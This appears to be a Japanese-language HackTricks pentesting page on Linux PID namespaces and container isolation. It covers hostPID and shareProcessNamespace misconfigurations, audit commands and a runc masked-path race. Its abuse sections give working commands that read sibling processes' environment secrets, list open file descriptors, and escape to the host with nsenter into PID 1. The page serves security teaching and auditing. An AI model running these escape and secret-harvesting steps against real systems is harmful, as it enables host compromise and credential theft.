# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## 概要

PID namespace は、プロセスの番号付け方法と、どのプロセスが可視になるかを制御します。そのため、コンテナは実際のマシンではないにもかかわらず、独自の PID 1 を持つことができます。namespace 内では、ワークロードからはローカルのプロセスツリーのように見えるものが表示されます。namespace の外側では、ホストは実際のホスト PID と、完全なプロセス状況を引き続き認識します。<sup>[[3]](#references)</sup>

セキュリティの観点では、プロセスの可視性には価値があるため、PID namespace が重要になります。ワークロードからホストプロセスが見えるようになると、サービス名、コマンドライン引数、プロセス引数に渡された秘密情報、`/proc` を通じた環境由来の状態、namespace-entry の対象候補などを観察できる可能性があります。さらに、適切な条件下でシグナル送信や ptrace を使用するなど、単にプロセスを見られるだけでないことが可能になると、問題ははるかに深刻になります。

## 操作

新しい PID namespace は、独自の内部プロセス番号から開始します。その中で最初に作成されたプロセスは、namespace の観点では PID 1 になります。これは、孤児化した子プロセスに対する init に似た特別なセマンティクスや、シグナル処理の動作を持つことも意味します。これにより、init プロセス、ゾンビプロセスの回収、コンテナで小さな init wrapper が使用されることがある理由など、コンテナにおける多くの奇妙な挙動を説明できます。<sup>[[3]](#references)</sup>

PID namespace は階層を形成します。祖先 namespace 内のプロセスは、その祖先で割り当てられた PID を使用して子孫を指定できます。しかし、子孫からは、通常の PID ベースの syscall を通じて祖先側だけに存在するタスクを指定したり、`setns()` によって上位の祖先 PID namespace に入ったりすることはできません。祖先が所有する procfs を意図的に子孫に公開すれば、祖先のプロセスビューが leak する可能性はあります。また、`setns()` で PID namespace に参加しても、変更されるのは呼び出し元自身ではなく**将来の子プロセス**に対する namespace です。そのため、ツールは参加後に fork します。procfs の mount は、それを mount したプロセスの PID ビューを保持します。これが、`unshare(CLONE_NEWPID)` の後に新しい procfs を作成することが、単なる見た目の問題ではなく、セキュリティ上重要になる理由です。<sup>[[3]](#references)</sup>

重要なセキュリティ上の教訓は、プロセスが自分の PID ツリーだけを見ているために分離されているように見えても、その分離は意図的に解除できるということです。Docker では `--pid=host` によってこれを公開し、Kubernetes では `hostPID: true` によって実現します。コンテナがホスト PID namespace に参加すると、ワークロードからホストプロセスが直接見えるようになり、その後の多くの攻撃経路がはるかに現実的になります。

## ラボ

PID namespace を手動で作成するには:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
シェルからは、プライベートなプロセスビューが見えるようになります。`--mount-proc` フラグが重要なのは、新しい PID namespace に対応する procfs インスタンスをマウントし、内部から見たプロセス一覧に一貫性を持たせるためです。<sup>[[3]](#references)</sup>

コンテナの動作と比較するには:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
この違いはすぐに理解できるため、読者にとって最初の lab として適しています。

## Runtime Usage

Docker、Podman、containerd、CRI-O の通常のコンテナには、それぞれ独自の PID namespace があります。Kubernetes のコンテナは通常、分離された PID view を持ちますが、`shareProcessNamespace: true` を明示的に設定すると、Pod 全体で 1 つの view が作成されます。<sup>[[4]](#references)</sup> 一方、`hostPID: true` は node の PID namespace を選択します。LXC/Incus 環境も同じ kernel primitive に依存していますが、system-container のユースケースでは、より複雑な process tree が公開され、より多くのデバッグ上の近道が使われる可能性があります。

同じルールがどこでも適用されます。runtime が PID namespace の isolate を選択しなかった場合、それは container boundary を意図的に弱めているということです。

## Misconfigurations

典型的な misconfiguration は host PID sharing です。チームはデバッグ、監視、または service-management の利便性を理由に正当化することがよくありますが、常に意味のある security exception として扱うべきです。コンテナに host process への直接的な write primitive がない場合でも、visibility だけでシステムに関する多くの情報が明らかになる可能性があります。`CAP_SYS_PTRACE` のような capabilities や有用な procfs access が追加されると、リスクは大幅に拡大します。

もう 1 つの間違いは、workload がデフォルトでは host process を kill したり ptrace したりできないため、host PID sharing は harmless だと考えることです。この結論は、enumeration の価値、namespace-entry targets の利用可能性、そして PID visibility が他の弱体化した controls と組み合わさる仕組みを無視しています。

### Kubernetes Pod-wide process sharing

`shareProcessNamespace: true` は `hostPID` とは異なります。node の process ではなく、**同じ Pod 内にある他のコンテナの process** を公開します。その結果、compromised sidecar または debug container は、procfs access checks の対象となる sibling の command lines や environment data を列挙でき、credentials が許可する場合は signals を送信でき、`/proc/<pid>/root` を通じて sibling の filesystem を traversеできます。Kubernetes は、command-line/environment secrets と container filesystems が、適用される Unix permissions によってのみ保護されることを明示的に警告しています。<sup>[[4]](#references)</sup>

Useful cluster-side review:
```bash
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
[.metadata.namespace,.metadata.name,
(.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```
Pod-wide PID namespace にある侵害された container から、可視性が読み取り可能性と同義だと仮定せず、まず実際にアクセスできるかをテストします。<sup>[[4]](#references)</sup>
```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```
## 悪用

ホストの PID namespace が共有されている場合、攻撃者はホストのプロセスを調査し、プロセス引数を収集し、興味深いサービスを特定し、`nsenter` 用の候補 PID を見つけたり、プロセスの可視性と ptrace 関連の権限を組み合わせて、ホストや近隣のワークロードに干渉したりできます。場合によっては、適切な長時間実行プロセスを見つけるだけで、その後の攻撃計画を大きく変えられます。

最初に実施すべき実践的な手順は、ホストのプロセスが本当に可視になっていることを確認することです：
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
ホストの PID が可視になると、process arguments と namespace-entry targets が最も有用な情報源になることが多い：
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
`nsenter` が利用可能で十分な権限がある場合、可視のホストプロセスを namespace bridge として使用できるかテストします。
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
エントリがブロックされている場合でも、host PID sharing は、service の構成、runtime components、次に target とする候補の privileged processes を明らかにするため、すでに有用です。PID visibility だけでは、signal の送信、trace、機密性の高い `/proc/<pid>` エントリの読み取り、target の他の namespaces への join は許可されません。credentials、target namespace を所有する user namespace 内の capabilities、Yama/LSM policy、seccomp も依然として重要です。<sup>[[3]](#references)</sup> process-injection の例については、[CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace) を参照してください。

Host PID visibility により、file-descriptor abuse もより現実的になります。privileged な host process または隣接する workload が機密性の高い file や socket を open している場合、attacker は `/proc/<pid>/fd/` を inspect し、ptrace-style checks、ownership、procfs mount options、object type、target service model に応じて、基礎となる object にアクセスできる可能性があります。FD symlink が見えるだけでは、それを open できることを意味しません。また、`/proc/<pid>/fd/N` symlink を open するだけで socket を複製することもできません。独立した `pidfd_getfd()` primitive とその authorization checks については、[Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md) を参照してください。<sup>[[3]](#references)</sup>
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
これらのコマンドは、`hidepid=1` または `hidepid=2` がプロセス間の可視性を低下させているか、また、開いている secret files、ログ、Unix sockets などの明らかに興味深い descriptor がそもそも見えるかどうかを確認するのに役立ちます。

### 完全な例: host PID + `nsenter`

プロセスが host namespaces に参加できるだけの十分な権限も持っている場合、Host PID の共有は直接的な host escape になります。
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
コマンドが成功すると、container process は host の mount、UTS、network、IPC、PID namespaces 内で実行される状態になります。影響は即時の host compromise です。

`nsenter` 自体が存在しない場合でも、host filesystem が mount されていれば、host binary を介して同じ結果を実現できる可能性があります。
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### 最近の Runtime に関する注意事項

PID namespace に関連する攻撃の中には、従来の `hostPID: true` の misconfiguration ではなく、container のセットアップ中に procfs の保護が適用される方法に関する Runtime の実装バグを悪用するものがあります。

#### `maskedPaths` から host の procfs への race

脆弱な `runc` のバージョンでは、container image または `runc exec` の workload を制御できる攻撃者が、container 側の `/dev/null` を `/proc/sys/kernel/core_pattern` などの機密性の高い procfs パスへの symlink に置き換えることで、masking phase との race を発生させられます。race に成功すると、masked-path の bind mount が誤った target に配置され、新しい container から host 全体に影響する procfs の設定値が露出する可能性があります。<sup>[[1]](#references)</sup>

Useful review command:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
これは重要です。最終的な影響は、直接的な procfs exposure と同じになる可能性があるためです。つまり、書き込み可能な `core_pattern` または `sysrq-trigger` に続いて、host code execution や denial of service が発生する可能性があります。専用の [masked paths](../masked-paths.md) と [sensitive host mounts](../../sensitive-host-mounts.md) のページでは、ここで重複して説明することなく、一般的な procfs attack surface を扱っています。

#### `insject` による Namespace injection

`insject` などの Namespace injection tools は、PID namespace との相互作用において、process creation 前に対象 namespace へ入っておくことが必須とは限らないことを示しています。helper は後から attach し、`setns()` を使用して、対象 PID space への visibility を維持したまま実行できます:<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
この種の technique は、主に高度な debugging、offensive tooling、そして runtime による workload の初期化が完了した後に namespace context を結合する必要がある post-exploitation workflow で重要になります。

### 関連する FD Abuse パターン

host PID が可視になっている場合、特に指摘すべきパターンが 2 つあります。1 つ目は、`O_CLOEXEC` が付けられていなかったため、privileged process が `execve()` の前後で sensitive file descriptor を開いたまま保持するケースです。2 つ目は、service が `SCM_RIGHTS` を通じて Unix socket 上で file descriptor を渡すケースです。どちらの場合も、重要なのは pathname ではなく、すでに開かれている handle です。この handle は、lower-privilege process に継承または受け渡しされる可能性があります。

これは container work において重要です。handle が `docker.sock`、privileged log、host secret file、またはその他の high-value object を指している可能性があるためです。たとえ、その path 自体に container filesystem から直接アクセスできない場合でも同様です。

## チェック

これらの command の目的は、process が private PID view を持っているのか、それともすでに、より広範な process landscape を enumerate できるのかを判断することです。
```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```
ここで重要なのは何でしょうか:<sup>[[3]](#references)</sup>

- プロセス一覧に明らかなホストサービスが含まれている場合、host PID sharingはすでに有効になっている可能性が高いです。
- 小さなコンテナ内限定のツリーしか見えないのが通常のベースラインです。`systemd`、`dockerd`、または無関係なデーモンが見える場合は通常ではありません。
- `NSpid`によって、ネストされたnamespace間のPIDマッピングが明らかになる場合があります。左端の値はprocfsマウントに関連付けられたPID namespaceから見た値で、その後に順番にネストされたnamespaceの値が続きます。
- `readlink /proc/self/ns/pid`だけでは`hostPID`の証明にはなりません。分離されたコンテナにも有効なPID-namespace inodeが存在するためです。プロセス一覧、procfsマウント、runtime設定、そして利用可能であればホスト側のnamespace inodeと照合してください。
- ホストPIDが見えるようになると、読み取り専用のプロセス情報でさえ有用な偵察情報になります。

host PID sharingで動作しているコンテナを発見した場合、それを単なる見た目上の違いとして扱わないでください。これは、ワークロードが観測でき、潜在的に影響を与えられる範囲を大きく変える重大な変更です。



## References

- [1] [runcセキュリティアドバイザリ: mount race conditionによる「masked path」悪用を介したコンテナ脱出 (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Tool Release – insject: Linux Namespace Injector](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Linux man-pages 6.19 book](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [Pod内のコンテナ間でProcess Namespaceを共有する](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
{{#include ../../../../../banners/hacktricks-training.md}}
